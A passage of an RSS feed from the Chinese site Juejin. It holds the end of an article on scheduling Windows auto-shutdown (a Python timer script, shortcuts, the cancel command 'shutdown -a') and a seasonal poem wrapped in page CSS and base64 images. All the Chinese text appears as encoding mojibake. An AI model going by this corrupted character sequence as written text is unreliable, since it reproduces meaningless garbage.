<li>è®¾ç½®å’Œå–æ¶ˆæŒ‰é’®</li>
</ul>
<h4 data-id="heading-8">æ–¹æ³•äºŒï¼šåˆ›å»ºå¿«æ·æ–¹å¼</h4>
<ul>
<li>è‡ªå®šä¹‰å¿«æ·æ–¹å¼åç§°</li>
<li>è®¾ç½®å…³æœºæ—¶é—´</li>
<li>é¢„è§ˆå¿«æ·æ–¹å¼å†…å®¹</li>
<li>åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼</li>
<li>æµ‹è¯•å¿«æ·æ–¹å¼åŠŸèƒ½</li>
</ul>
<h4 data-id="heading-9">æ–¹æ³•ä¸‰ï¼šå®šæ—¶ä»»åŠ¡ï¼ˆç®€åŒ–ç‰ˆï¼‰</h4>
<ul>
<li>è®¾ç½®æ¯å¤©å›ºå®šæ—¶é—´è‡ªåŠ¨å…³æœº</li>
<li>æ¨¡æ‹ŸWindowsä»»åŠ¡è®¡åˆ’åŠŸèƒ½</li>
<li>æ˜¾ç¤ºä¸‹æ¬¡å…³æœºæ—¶é—´</li>
<li>å¯åŠ¨/åœæ­¢å®šæ—¶ä»»åŠ¡</li>
<li>æµ‹è¯•åŠŸèƒ½</li>
</ul>
<h3 data-id="heading-10">ä½¿ç”¨è¯´æ˜</h3>
<ol>
<li>
<p><strong>è¿è¡Œç¨‹åº</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">python shutdown_timer.py
</code></pre>
</li>
<li>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li>ç¨‹åºéœ€è¦Windowsç³»ç»Ÿæ”¯æŒ</li>
<li>æ–¹æ³•ä¸‰ä¸ºPythonæ¨¡æ‹Ÿå®ç°ï¼Œå…³é—­ç¨‹åºä¼šåœæ­¢å®šæ—¶ä»»åŠ¡</li>
<li>çœŸå®çš„Windowsä»»åŠ¡è®¡åˆ’éœ€è¦ç®¡ç†å‘˜æƒé™å’Œæ›´å¤æ‚çš„é…ç½®</li>
</ul>
</li>
<li>
<p><strong>å®‰å…¨æé†’</strong>ï¼š</p>
<ul>
<li>å®šæ—¶å…³æœºå‰è¯·ä¿å­˜å¥½æ‰€æœ‰å·¥ä½œ</li>
<li>æµ‹è¯•æ—¶å»ºè®®è®¾ç½®è¾ƒçŸ­æ—¶é—´ï¼ˆå¦‚5åˆ†é’Ÿï¼‰</li>
<li>è®°ä½å¯ä»¥ä½¿ç”¨<code>shutdown -a</code>å‘½ä»¤æˆ–ç¨‹åºçš„å–æ¶ˆåŠŸèƒ½</li>
</ul>
</li>
</ol>
<h4 data-id="heading-11"><strong>é‡è¦æé†’</strong></h4>
<ul>
<li><strong>ä¿å­˜å·¥ä½œ</strong>ï¼šåœ¨è®¾ç½®è‡ªåŠ¨å…³æœºå‰ï¼Œè¯·åŠ¡å¿…ä¿å­˜å¥½æ‰€æœ‰æ‰“å¼€çš„æ–‡ä»¶å’Œå·¥ä½œè¿›åº¦ï¼Œé˜²æ­¢æ•°æ®ä¸¢å¤±ã€‚</li>
<li><strong>å–æ¶ˆå‘½ä»¤</strong>ï¼šè®°ä½å–æ¶ˆå‘½ä»¤ <code>shutdown -a</code>ï¼Œæˆ–è€…å»ä»»åŠ¡è®¡åˆ’ç¨‹åºé‡Œç¦ç”¨ä»»åŠ¡ï¼Œä»¥å¤‡ä¸æ—¶ä¹‹éœ€ã€‚</li>
</ul>
<p><strong>æ€»ç»“å»ºè®®</strong>ï¼š</p>
<ul>
<li><strong>ä¸´æ—¶ç”¨ä¸€æ¬¡</strong>ï¼šç”¨ <strong>æ–¹æ³•ä¸€</strong> è¿è¡Œå‘½ä»¤ã€‚</li>
<li><strong>ç»å¸¸å›ºå®šæ—¶é—´ç”¨</strong>ï¼šç”¨ <strong>æ–¹æ³•äºŒ</strong> åˆ›å»ºå¿«æ·æ–¹å¼ã€‚</li>
<li><strong>é•¿æœŸè§„å¾‹æ€§å®šæ—¶</strong>ï¼šç”¨ <strong>æ–¹æ³•ä¸‰</strong> ä»»åŠ¡è®¡åˆ’ç¨‹åºã€‚</li>
<li><strong>æ€•éº»çƒ¦ï¼Œå–œæ¬¢ç‚¹é¼ æ ‡</strong>ï¼šç”¨ <strong>æ–¹æ³•å››</strong> ç¬¬ä¸‰æ–¹è½¯ä»¶ã€‚</li>
</ul>
<p>é€‰æ‹©æœ€é€‚åˆä½ çš„æ–¹æ³•å³å¯ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Šå››æ—¶æ­Œã€‹]]></title>    <link>https://juejin.cn/post/7592520539152941065</link>    <guid>https://juejin.cn/post/7592520539152941065</guid>    <pubDate>2026-01-08T02:29:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592520539152941065" data-draft-id="7592582130593923123" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Šå››æ—¶æ­Œã€‹"/> <meta itemprop="keywords" content="æ˜é‡‘Â·æ—¥æ–°è®¡åˆ’"/> <meta itemprop="datePublished" content="2026-01-08T02:29:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Šå››æ—¶æ­Œã€‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:29:28.000Z" title="Thu Jan 08 2026 02:29:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 20px;background-image:url("data:image/png;base64,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")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,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");background-size:100% 100%;background-repeat:no-repeat;width:15px;height:15px;margin:auto}.markdown-body h3{width:100%;text-align:left;margin:20px 10px 0 0;font-size:18px;font-weight:700;display:inline-block;padding-left:10px;padding-bottom:0;border-left:5px solid #8f6600;color:#614500}.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:700;color:#a37400}.markdown-body h4{font-size:17px}.markdown-body h5,.markdown-body h6{display:flex;align-items:center}.markdown-body h5:after,.markdown-body h6:after{display:inline-block;border:2px solid #fff6e0;color:rgba(189,134,0,.5);border-radius:50%;text-align:center;margin-left:5px}.markdown-body h5{font-size:14px}.markdown-body h5:after{content:"5";width:15px;height:15px;line-height:15px;font-size:13px}.markdown-body h6{font-size:12px}.markdown-body h6:after{content:"6";width:13px;height:13px;line-height:13px;font-size:12px}.markdown-body p{color:#412c0c;letter-spacing:1px;font-weight:400;margin-bottom:16px}.markdown-body img{max-width:100%;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#755300;font-weight:400;border-bottom:1px solid #755300;font-weight:bolder;text-decoration:none}.markdown-body table{width:100%!important;margin:0;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border-spacing:0}.markdown-body table img{box-shadow:none}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body thead tr th{text-align:center}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;box-sizing:border-box;border:1px solid rgba(72,42,10,.1)}.markdown-body blockquote{position:relative;text-size-adjust:100%;line-height:25px;font-weight:400;border-radius:10px;font-style:normal;text-align:left;box-sizing:inherit;border:1px solid #ffd87a;background-color:rgba(189,134,0,.5);margin:20px 0;padding:20px}.markdown-body blockquote p{color:#fff6e0;letter-spacing:2px;margin:0}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;color:#cc9100;font-size:34px;font-weight:700}.markdown-body blockquote:before{content:"â";top:8px;left:5px}.markdown-body blockquote:after{content:"â";right:5px;bottom:-5px}.markdown-body strong{color:#c28a00;font-weight:bolder}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{color:#c28a00}.markdown-body em strong{font-style:normal;color:#c28a00;background-color:#8a6200}.markdown-body s{color:#c28a00}.markdown-body hr{border-top:1px solid #805b00}.markdown-body code,.markdown-body li code,.markdown-body p code{color:#996d00;background-color:rgba(130,98,0,.3)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit;color:#858585;font-family:bold;letter-spacing:1px}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection,.markdown-body img::selection{color:rgba(189,134,0,.5);background-color:#fff}.markdown-body a::selection,.markdown-body b::selection,.markdown-body del::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:transparent}.markdown-body pre&gt;code::selection{background-color:rgba(189,134,0,.5)}.markdown-body .math .math-inline::selection,.markdown-body blockquote::selection,.markdown-body ol::selection,.markdown-body p::selection,.markdown-body strong::selection,.markdown-body table::selection,.markdown-body ul::selection{background-color:rgba(189,134,0,.5)}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ˜¥é£æ‹‚æŸ³ç»¿çƒŸè½»ï¼Œ<br/>
èŠ±å½±æµèºæ»¡å²¸ç”Ÿã€‚<br/>
ä¸€å¤œé›¨å£°å‚¬ä¸‡ç‰©ï¼Œ<br/>
ä¸œé£åˆæŠŠæ—§å±±æ˜ã€‚</p>
<p>å¤äº‘å·å°½å¤©å¿ƒè¿œï¼Œ<br/>
è·å¶æ— å°˜æ˜ æ°´æ¸…ã€‚<br/>
è›™å”±ç¨»é¦™çœ æœˆä¸‹ï¼Œ<br/>
é“¶æ²³å€’æ˜ æ¢¦åˆæˆã€‚</p>
<p>ç§‹æ¥éœœæŸ“æ«å¦‚ç«ï¼Œ<br/>
é›å½±æƒŠå¯’ç…§ç¢§æ™´ã€‚<br/>
ä¸€å£¶æ–°é…’é‚€æ˜æœˆï¼Œ<br/>
é»„å¶é£˜é›¶ä¸æ‹åº­ã€‚</p>
<p>å†¬é›ªæ¶ˆå£°å¤©åœ°å¯‚ï¼Œ<br/>
æ¾ææŒ‚ç‰å¤œæ— å£°ã€‚<br/>
æ¢…èŠ±ä¸‰å¼„é¦™çŠ¹åœ¨ï¼Œ<br/>
